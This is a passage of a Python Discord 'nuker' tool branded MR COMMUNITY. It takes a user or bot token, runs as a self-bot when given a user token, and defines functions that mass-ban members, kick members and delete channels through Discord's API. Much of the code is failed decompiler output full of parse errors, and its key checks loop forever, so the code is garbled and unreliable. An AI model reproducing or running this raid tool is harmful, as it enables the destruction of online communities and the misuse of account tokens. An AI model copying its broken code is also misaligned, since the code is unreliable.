Moving forward\n")
time.sleep(3)
os.system('cls')
print(f"\n\n{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██████{colors.gray}╗      {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗\n{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}╔════╝{Fore.LIGHTBLACK_EX}██{colors.gray}╔══={Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚══{Fore.LIGHTBLACK_EX}██{colors.gray}╔══╝╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}╔╝\n{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝ \n{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║     ╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝  \n{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║  {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╗╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚{Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║      {Fore.LIGHTBLACK_EX}██{colors.gray}║   \n{colors.gray}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝ \n              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━           \n\n\n\n \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Service by MrTools.                                         \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Debug{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Proxies by MrTools.     \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Info{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Launched Machine by MrTools.    \n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Watcher{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine passed checks sucessfully. Moving forward     \n· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Info{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX}Client version: 1.0.0 is up  to date.\n")
time.sleep(3)
os.system('cls')
print(f"\n\n{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██████{colors.gray}╗      {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ {Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}███{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}███{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╗   {Fore.LIGHTBLACK_EX}██{colors.gray}╗\n{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}╔════╝{Fore.LIGHTBLACK_EX}██{colors.gray}╔══={Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗ {Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚══{Fore.LIGHTBLACK_EX}██{colors.gray}╔══╝╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}╔╝\n{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}████{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}╗ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝ \n{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗    {Fore.LIGHTBLACK_EX}██{colors.gray}║     {Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║     ╚{Fore.LIGHTBLACK_EX}██{colors.gray}╔╝  \n{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║  {Fore.LIGHTBLACK_EX}██{colors.gray}║    ╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╗╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚═╝ {Fore.LIGHTBLACK_EX}██{colors.gray}║╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║ ╚{Fore.LIGHTBLACK_EX}████{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║   {Fore.LIGHTBLACK_EX}██{colors.gray}║      {Fore.LIGHTBLACK_EX}██{colors.gray}║   \n{colors.gray}╚═╝     ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝ \n              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   \n\n\n\n \n")
key = input(f"·{Fore.LIGHTBLACK_EX}√{Fore.LIGHTBLACK_EX} {Fore.LIGHTBLACK_EX}[{Fore.LIGHTCYAN_EX}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}]{colors.gray} AUTH KEY : {Fore.LIGHTBLACK_EX}")
key2 = input(f"·{Fore.LIGHTBLACK_EX}√{Fore.LIGHTBLACK_EX} {Fore.LIGHTBLACK_EX}[{Fore.LIGHTCYAN_EX}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}]{colors.gray} INVITE : {Fore.LIGHTBLACK_EX} ")
token = input(f"·{Fore.LIGHTBLACK_EX}√{Fore.LIGHTBLACK_EX} {Fore.LIGHTBLACK_EX}[{Fore.LIGHTCYAN_EX}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}]{colors.gray} ENTER TOKEN : {Fore.LIGHTBLACK_EX}")
while True:
    while True:
        if key == '4132':
            print('')
            print(f"")

    print('Invalid auth key! Restart the program!')

while True:
    while True:
        if key2 == '858883177811279872':
            print('')
            print(f"")

    print('Invalid invite! Restart the program!')

os.system('cls')

def check_token():
    if requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': f"{token}"}).status_code == 200:
        return 'user'
    return 'bot'


token_type = check_token()
intents = discord.Intents.all()
intents.members = True
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix='>', case_insensitive=False, self_bot=True, intents=intents)
elif token_type == 'bot':
    headers = {'Authorization': f"Bot {token}"}
    client = commands.Bot(command_prefix='>', case_insensitive=False, intents=intents)
client.remove_command('help')

class skid:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'

    def BanMembers--- This code section failed: ---
              0_0  COME_FROM           270  '270'
              0_1  COME_FROM           264  '264'
              0_2  COME_FROM            54  '54'

 L. 230         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                put
                4  LOAD_STR                 'https://discord.com/api/v8/guilds/'
                6  LOAD_FAST                'guild'
                8  FORMAT_VALUE          0  ''
               10  LOAD_STR                 '/bans/'
               12  LOAD_FAST                'member'
               14  FORMAT_VALUE          0  ''
               16  BUILD_STRING_4        4 
               18  LOAD_GLOBAL              headers
               20  LOAD_CONST               ('headers',)
               22  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               24  STORE_FAST               'r'

 L. 231        26  LOAD_STR                 'retry_after'
               28  LOAD_FAST                'r'
               30  LOAD_ATTR                text
               32  <118>                 0  ''
               34  POP_JUMP_IF_FALSE    56  'to 56'

 L. 232        36  LOAD_GLOBAL              time
               38  LOAD_METHOD              sleep
               40  LOAD_FAST                'r'
               42  LOAD_METHOD              json
               44  CALL_METHOD_0         0  ''
               46  LOAD_STR                 'retry_after'
               48  BINARY_SUBSCR    
               50  CALL_METHOD_1         1  ''
               52  POP_TOP          
               54  JUMP_BACK             0  'to 0'
             56_0  COME_FROM            34  '34'

 L. 234        56  LOAD_FAST                'r'
               58  LOAD_ATTR                status_code
               60  LOAD_CONST               200
               62  COMPARE_OP               ==
               64  POP_JUMP_IF_TRUE     88  'to 88'
               66  LOAD_FAST                'r'
               68  LOAD_ATTR                status_code
               70  LOAD_CONST               201
               72  COMPARE_OP               ==
               74  POP_JUMP_IF_TRUE     88  'to 88'
               76  LOAD_FAST                'r'
               78  LOAD_ATTR                status_code
               80  LOAD_CONST               204
               82  COMPARE_OP               ==
            84_86  POP_JUMP_IF_FALSE   272  'to 272'
             88_0  COME_FROM            74  '74'
             88_1  COME_FROM            64  '64'

 L. 235        88  LOAD_GLOBAL              print
               90  LOAD_GLOBAL              colors
               92  LOAD_ATTR                gray
               94  FORMAT_VALUE          0  ''
               96  LOAD_STR                 '['
               98  LOAD_GLOBAL              colors
              100  LOAD_ATTR                gray
              102  FORMAT_VALUE          0  ''
              104  LOAD_GLOBAL              Fore
              106  LOAD_ATTR                GREEN
              108  FORMAT_VALUE          0  ''
              110  LOAD_STR                 '√'
              112  LOAD_GLOBAL              Fore
              114  LOAD_ATTR                GREEN
              116  FORMAT_VALUE          0  ''
              118  LOAD_GLOBAL              colors
              120  LOAD_ATTR                gray
              122  FORMAT_VALUE          0  ''
              124  LOAD_STR                 ']'
              126  LOAD_GLOBAL              colors
              128  LOAD_ATTR                gray
              130  FORMAT_VALUE          0  ''
              132  LOAD_STR                 ' '
              134  LOAD_GLOBAL              Fore
              136  LOAD_ATTR                LIGHTBLACK_EX
              138  FORMAT_VALUE          0  ''
              140  LOAD_STR                 '· '
              142  LOAD_GLOBAL              colors
              144  LOAD_ATTR                gray
              146  FORMAT_VALUE          0  ''
              148  LOAD_STR                 '['
              150  LOAD_GLOBAL              colors
              152  LOAD_ATTR                gray
              154  FORMAT_VALUE          0  ''
              156  LOAD_GLOBAL              Fore
              158  LOAD_ATTR                LIGHTBLACK_EX
              160  FORMAT_VALUE          0  ''
              162  LOAD_GLOBAL              ok
              164  FORMAT_VALUE          0  ''
              166  LOAD_GLOBAL              Fore
              168  LOAD_ATTR                LIGHTBLACK_EX
              170  FORMAT_VALUE          0  ''
              172  LOAD_GLOBAL              colors
              174  LOAD_ATTR                gray
              176  FORMAT_VALUE          0  ''
              178  LOAD_STR                 '] '
              180  LOAD_GLOBAL              colors
              182  LOAD_ATTR                gray
              184  FORMAT_VALUE          0  ''
              186  LOAD_STR                 '['
              188  LOAD_GLOBAL              colors
              190  LOAD_ATTR                gray
              192  FORMAT_VALUE          0  ''
              194  LOAD_GLOBAL              Fore
              196  LOAD_ATTR                LIGHTBLACK_EX
              198  FORMAT_VALUE          0  ''
              200  LOAD_STR                 'Client'
              202  LOAD_GLOBAL              Fore
              204  LOAD_ATTR                LIGHTBLACK_EX
              206  FORMAT_VALUE          0  ''
              208  LOAD_GLOBAL              colors
              210  LOAD_ATTR                gray
              212  FORMAT_VALUE          0  ''
              214  LOAD_STR                 '] '
              216  LOAD_GLOBAL              Fore
              218  LOAD_ATTR                LIGHTBLACK_EX
              220  FORMAT_VALUE          0  ''
              222  LOAD_STR                 ' punished  client Banned '
              224  LOAD_GLOBAL              Fore
              226  LOAD_ATTR                LIGHTCYAN_EX
              228  FORMAT_VALUE          0  ''
              230  LOAD_STR                 ' '
              232  LOAD_GLOBAL              Fore
              234  LOAD_ATTR                GREEN
              236  FORMAT_VALUE          0  ''
              238  LOAD_FAST                'member'
              240  LOAD_METHOD              strip
              242  CALL_METHOD_0         0  ''
              244  FORMAT_VALUE          0  ''
              246  LOAD_STR                 ' '
              248  LOAD_GLOBAL              Fore
              250  LOAD_ATTR                GREEN
              252  FORMAT_VALUE          0  ''
              254  BUILD_STRING_36      36 
              256  CALL_FUNCTION_1       1  ''
              258  POP_TOP          

 L. 236   260_262  JUMP_FORWARD        272  'to 272'
              264  JUMP_BACK             0  'to 0'

 L. 238   266_268  JUMP_FORWARD        272  'to 272'
              270  JUMP_BACK             0  'to 0'
            272_0  COME_FROM           266  '266'
            272_1  COME_FROM           260  '260'
            272_2  COME_FROM            84  '84'

Parse error at or near `<118>' instruction at offset 32

    def KickMembers--- This code section failed: ---
              0_0  COME_FROM           262  '262'
              0_1  COME_FROM           256  '256'
              0_2  COME_FROM            54  '54'

 L. 242         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                delete
                4  LOAD_STR                 'https://discord.com/api/v8/guilds/'
                6  LOAD_FAST                'guild'
                8  FORMAT_VALUE          0  ''
               10  LOAD_STR                 '/members/'
               12  LOAD_FAST                'member'
               14  FORMAT_VALUE          0  ''
               16  BUILD_STRING_4        4 
               18  LOAD_GLOBAL              headers
               20  LOAD_CONST               ('headers',)
               22  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               24  STORE_FAST               'r'

 L. 243        26  LOAD_STR                 'retry_after'
               28  LOAD_FAST                'r'
               30  LOAD_ATTR                text
               32  <118>                 0  ''
               34  POP_JUMP_IF_FALSE    56  'to 56'

 L. 244        36  LOAD_GLOBAL              time
               38  LOAD_METHOD              sleep
               40  LOAD_FAST                'r'
               42  LOAD_METHOD              json
               44  CALL_METHOD_0         0  ''
               46  LOAD_STR                 'retry_after'
               48  BINARY_SUBSCR    
               50  CALL_METHOD_1         1  ''
               52  POP_TOP          
               54  JUMP_BACK             0  'to 0'
             56_0  COME_FROM            34  '34'

 L. 246        56  LOAD_FAST                'r'
               58  LOAD_ATTR                status_code
               60  LOAD_CONST               200
               62  COMPARE_OP               ==
               64  POP_JUMP_IF_TRUE     88  'to 88'
               66  LOAD_FAST                'r'
               68  LOAD_ATTR                status_code
               70  LOAD_CONST               201
               72  COMPARE_OP               ==
               74  POP_JUMP_IF_TRUE     88  'to 88'
               76  LOAD_FAST                'r'
               78  LOAD_ATTR                status_code
               80  LOAD_CONST               204
               82  COMPARE_OP               ==
            84_86  POP_JUMP_IF_FALSE   264  'to 264'
             88_0  COME_FROM            74  '74'
             88_1  COME_FROM            64  '64'

 L. 247        88  LOAD_GLOBAL              print
               90  LOAD_GLOBAL              colors
               92  LOAD_ATTR                gray
               94  FORMAT_VALUE          0  ''
               96  LOAD_STR                 '['
               98  LOAD_GLOBAL              colors
              100  LOAD_ATTR                gray
              102  FORMAT_VALUE          0  ''
              104  LOAD_GLOBAL              Fore
              106  LOAD_ATTR                GREEN
              108  FORMAT_VALUE          0  ''
              110  LOAD_STR                 '√'
              112  LOAD_GLOBAL              Fore
              114  LOAD_ATTR                GREEN
              116  FORMAT_VALUE          0  ''
              118  LOAD_GLOBAL              colors
              120  LOAD_ATTR                gray
              122  FORMAT_VALUE          0  ''
              124  LOAD_STR                 ']'
              126  LOAD_GLOBAL              colors
              128  LOAD_ATTR                gray
              130  FORMAT_VALUE          0  ''
              132  LOAD_STR                 ' '
              134  LOAD_GLOBAL              Fore
              136  LOAD_ATTR                LIGHTBLACK_EX
              138  FORMAT_VALUE          0  ''
              140  LOAD_STR                 '· '
              142  LOAD_GLOBAL              colors
              144  LOAD_ATTR                gray
              146  FORMAT_VALUE          0  ''
              148  LOAD_STR                 '['
              150  LOAD_GLOBAL              colors
              152  LOAD_ATTR                gray
              154  FORMAT_VALUE          0  ''
              156  LOAD_GLOBAL              Fore
              158  LOAD_ATTR                LIGHTBLACK_EX
              160  FORMAT_VALUE          0  ''
              162  LOAD_GLOBAL              ok
              164  FORMAT_VALUE          0  ''
              166  LOAD_GLOBAL              Fore
              168  LOAD_ATTR                LIGHTBLACK_EX
              170  FORMAT_VALUE          0  ''
              172  LOAD_GLOBAL              colors
              174  LOAD_ATTR                gray
              176  FORMAT_VALUE          0  ''
              178  LOAD_STR                 '] '
              180  LOAD_GLOBAL              colors
              182  LOAD_ATTR                gray
              184  FORMAT_VALUE          0  ''
              186  LOAD_STR                 '['
              188  LOAD_GLOBAL              colors
              190  LOAD_ATTR                gray
              192  FORMAT_VALUE          0  ''
              194  LOAD_GLOBAL              Fore
              196  LOAD_ATTR                LIGHTBLACK_EX
              198  FORMAT_VALUE          0  ''
              200  LOAD_STR                 'Client'
              202  LOAD_GLOBAL              Fore
              204  LOAD_ATTR                LIGHTBLACK_EX
              206  FORMAT_VALUE          0  ''
              208  LOAD_GLOBAL              colors
              210  LOAD_ATTR                gray
              212  FORMAT_VALUE          0  ''
              214  LOAD_STR                 '] '
              216  LOAD_GLOBAL              Fore
              218  LOAD_ATTR                LIGHTBLACK_EX
              220  FORMAT_VALUE          0  ''
              222  LOAD_STR                 ' punished  client Kicked '
              224  LOAD_GLOBAL              Fore
              226  LOAD_ATTR                LIGHTCYAN_EX
              228  FORMAT_VALUE          0  ''
              230  LOAD_STR                 ' '
              232  LOAD_GLOBAL              Fore
              234  LOAD_ATTR                GREEN
              236  FORMAT_VALUE          0  ''
              238  LOAD_FAST                'member'
              240  LOAD_METHOD              strip
              242  CALL_METHOD_0         0  ''
              244  FORMAT_VALUE          0  ''
              246  BUILD_STRING_34      34 
              248  CALL_FUNCTION_1       1  ''
              250  POP_TOP          

 L. 248   252_254  JUMP_FORWARD        264  'to 264'
              256  JUMP_BACK             0  'to 0'

 L. 250   258_260  JUMP_FORWARD        264  'to 264'
              262  JUMP_BACK             0  'to 0'
            264_0  COME_FROM           258  '258'
            264_1  COME_FROM           252  '252'
            264_2  COME_FROM            84  '84'

Parse error at or near `<118>' instruction at offset 32

    def DeleteChannels--- This code section failed: ---
              0_0  COME_FROM           250  '250'
              0_1  COME_FROM           246  '246'
              0_2  COME_FROM            48  '48'

 L. 254         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                delete
                4  LOAD_STR                 'https://discord.com/api/v8/channels/'
                6  LOAD_FAST                'channel'
                8  FORMAT_VALUE          0  ''
               10  BUILD_STRING_2        2 
               12  LOAD_GLOBAL              headers
               14  LOAD_CONST               ('headers',)
               16  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               18  STORE_FAST               'r'

 L. 255        20  LOAD_STR                 'retry_after'
               22  LOAD_FAST                'r'
               24  LOAD_ATTR                text
               26  <118>                 0  ''
               28  POP_JUMP_IF_FALSE    50  'to 50'

 L. 256        30  LOAD_GLOBAL              time
               32  LOAD_METHOD              sleep
               34  LOAD_FAST                'r'
               36  LOAD_METHOD              json
               38  CALL_METHOD_0         0  ''
               40  LOAD_STR                 'retry_after'
               42  BINARY_SUBSCR    
               44  CALL_METHOD_1         1  ''
               46  POP_TOP          
               48  JUMP_BACK             0  'to 0'
             50_0  COME_FROM            28  '28'

 L. 258        50  LOAD_FAST                'r'
               52  LOAD_ATTR                status_code
               54  LOAD_CONST               200
               56  COMPARE_OP               ==
               58  POP_JUMP_IF_TRUE     80  'to 80'
               60  LOAD_FAST                'r'
               62  LOAD_ATTR                status_code
               64  LOAD_CONST               201
               66  COMPARE_OP               ==
               68  POP_JUMP_IF_TRUE     80  'to 80'
               70  LOAD_FAST                'r'
               72  LOAD_ATTR                status_code
               74  LOAD_CONST               204
               76  COMPARE_OP               ==
               78  POP_JUMP_IF_FALSE   252  'to 252'
             80_0  COME_FROM            68  '68'
             80_1  COME_FROM            58  '58'

 L. 259        80  LOAD_GLOBAL              print
               82  LOAD_GLOBAL              colors
               84  LOAD_ATTR                gray
               86  FORMAT_VALUE          0  ''
               88  LOAD_STR                 '['
               90  LOAD_GLOBAL              colors
               92  LOAD_ATTR                gray
               94  FORMAT_VALUE          0  ''
               96  LOAD_GLOBAL              Fore
               98  LOAD_ATTR                GREEN
              100  FORMAT_VALUE          0  ''
              102  LOAD_STR                 '√'
              104  LOAD_GLOBAL              Fore
              106  LOAD_ATTR                GREEN
              108  FORMAT_VALUE          0  ''
              110  LOAD_GLOBAL              colors
              112  LOAD_ATTR                gray
              114  FORMAT_VALUE          0  ''
              116  LOAD_STR                 ']'
              118  LOAD_GLOBAL              colors
              120  LOAD_ATTR                gray
              122  FORMAT_VALUE          0  ''
              124  LOAD_STR                 ' '
              126  LOAD_GLOBAL              Fore
              128  LOAD_ATTR                LIGHTBLACK_EX
              130  FORMAT_VALUE          0  ''
              132  LOAD_STR                 '· '
              134  LOAD_GLOBAL              colors
              136  LOAD_ATTR                gray
              138  FORMAT_VALUE          0  ''
              140  LOAD_STR                 '['
              142  LOAD_GLOBAL              colors
              144  LOAD_ATTR                gray
              146  FORMAT_VALUE          0  ''
              148  LOAD_GLOBAL              Fore
              150  LOAD_ATTR                LIGHTBLACK_EX
              152  FORMAT_VALUE          0  ''
              154  LOAD_GLOBAL              ok
